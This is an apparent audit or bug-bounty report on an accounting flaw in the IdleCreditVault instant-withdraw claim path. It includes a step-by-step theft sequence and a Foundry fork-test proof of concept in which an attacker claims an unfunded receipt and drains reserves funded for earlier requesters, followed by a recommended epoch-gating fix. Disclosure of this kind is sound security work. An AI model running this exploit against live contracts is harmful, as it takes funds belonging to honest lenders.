### Title
Unfunded instant-withdraw receipts can be claimed in the same epoch, draining funds reserved for earlier requesters - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.claimInstantWithdrawRequest` pays out any `instantWithdrawsRequests[_user]` balance without checking that the request belongs to an epoch whose funding has actually been collected. A KYC-passing lender can request an instant withdraw during a running epoch and claim it immediately in the same transaction, receiving underlying that `collectInstantWithdrawFunds` had transferred in to back *other* users' instant-withdraw receipts. This is the same bug class as the Pterodactyl issue: permission granted for one action (creating a request) implicitly authorizes a different action (settling a claim) because no per-action/per-epoch validation is performed.

### Finding Description
Instant withdrawals follow a two-phase design:

1. `requestInstantWithdraw(_amount, _user)` burns the user's strategy tokens at the CDO and mints a receipt, then records the request in `instantWithdrawsRequestsByEpoch[_user][epochNumber]` and `pendingInstantWithdraws` [1](#0-0) .
2. Only when the CDO later funds the queue does `collectInstantWithdrawFunds` pull underlying from the CDO into the strategy and decrement `pendingInstantWithdraws` [2](#0-1) .

The claim path then burns the full receipt and transfers underlying via `_transferFundedClaim` [3](#0-2) . Unlike normal withdraw claims, which enforce `epochNumber > lastWithdrawRequest[_user]` before paying a funded request [4](#0-3) , the instant claim has **no epoch gating and no check that the specific receipt was funded**. `instantWithdrawsRequestsByEpoch` / `instantWithdrawClaimsByEpoch` are only consulted for default finalization, not for the happy-path claim [5](#0-4) . `_transferFundedClaim` only isolates `defaultRecoveryReserve`; it does not reserve or verify instant-withdraw funding [6](#0-5) .

Attack sequence (running epoch, fixed-APR or APR0 mode):

1. Honest lender A requests an instant withdraw in epoch N. Epoch N stops; the borrower returns funds and `collectInstantWithdrawFunds` moves A's underlying into the strategy, decrementing `pendingInstantWithdraws` to 0. A has not yet claimed.
2. Attacker B (KYC-passing lender holding tranche tokens) calls `requestInstantWithdraw` via the CDO for amount X ≤ A's funded balance. A receipt is minted to B and `pendingInstantWithdraws += X` (B's request is unfunded — the borrower will only fund it at the *next* epoch boundary).
3. In the same transaction, B calls `claimInstantWithdrawRequest(B)` via the CDO. The function burns B's receipt and transfers X underlying — taken from A's funded reserve.
4. A's subsequent claim reverts on insufficient strategy balance. Additionally, `pendingInstantWithdraws` still contains B's X but `instantWithdrawsRequests[B]` was zeroed, permanently desynchronizing the queue accounting.

### Impact Explanation
Direct theft of funded withdrawal proceeds. The attacker extracts underlying equal to the entire instant-withdraw reserve held by the strategy (up to the attacker's own tranche balance, since step 2 burns strategy tokens 1:1). Honest requesters' claims become permanently unpayable (insolvency of the funded bucket), and `pendingInstantWithdraws` is left permanently overstated, which also poisons `defaultPendingClaimBasis` used by `finalizeDefaultRecovery` [7](#0-6)  — inflating the default-epoch claim basis and diluting recovery for all other claimants if a default later occurs.

### Likelihood Explanation
Requires only a KYC-passing lender position and one transaction executed while the strategy holds a positive funded instant-withdraw reserve (i.e., any epoch where a previous instant request was funded but not yet claimed). No privileged role, no oracle manipulation, no borrower misbehavior is needed. The window exists whenever pending instant claims remain unclaimed after funding.

### Recommendation
Track the request epoch per user for instant withdrawals (e.g., `lastInstantWithdrawRequest[_user]`) and gate `claimInstantWithdrawRequest` on `epochNumber > lastInstantWithdrawRequest[_user]`, mirroring `_claimFundedWithdrawRequest`. Alternatively, maintain a funded-vs-requested bucket per epoch and revert claims for epochs not yet covered by `collectInstantWithdrawFunds`. The invariant to enforce: a receipt is payable only after the epoch it was requested in has been funded.

### Proof of Concept
Foundry fork test (mainnet) against a live `IdleCDOEpochVariant` + `IdleCreditVault` pair:

```solidity
// test/foundry/InstantWithdrawClaimTheft.t.sol
function test_UnfundedInstantClaimStealsReserve() public {
    // epoch N: lenderA requests instant withdraw of AMT via idleCDO
    vm.prank(lenderA);
    cdo.requestInstantWithdraw(AMT); // strategy.requestInstantWithdraw mints receipt

    // epoch N stops; borrower funds; CDO calls collectInstantWithdrawFunds(AMT)
    // strategy now holds AMT underlying; pendingInstantWithdraws == 0
    stopAndFundEpoch();

    // attacker (KYC lender with tranche tokens), same running epoch N+1:
    vm.startPrank(attacker);
    cdo.depositAA(DEP);                       // get strategy tokens (indirectly)
    cdo.requestInstantWithdraw(ATTACK);       // ATTACK <= AMT; receipt minted, UNFUNDED
    cdo.claimInstantWithdrawRequest();        // <-- pays ATTACK from A's funded reserve
    vm.stopPrank();

    assertEq(underlying.balanceOf(attacker), ATTACK); // attacker stole funded funds

    // lenderA's claim now fails: strategy balance < AMT
    vm.prank(lenderA);
    vm.expectRevert(); // ERC20 transfer amount exceeds balance
    cdo.claimInstantWithdrawRequest();

    // accounting desync: pendingInstantWithdraws still == ATTACK with no receipt
    assertEq(strategy.pendingInstantWithdraws(), ATTACK);
    assertEq(strategy.instantWithdrawsRequests(attacker), 0);
}
```

Notes on residual uncertainty: the exact user-facing entrypoint name on `IdleCDOEpochVariant` (`requestInstantWithdraw`/`claimInstantWithdrawRequest` wrappers) should be confirmed against that file, but it merely forwards to the strategy functions cited above; the missing funding check exists entirely in `IdleCreditVault.claimInstantWithdrawRequest`.

```text
  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }
```

```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }
```

```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```
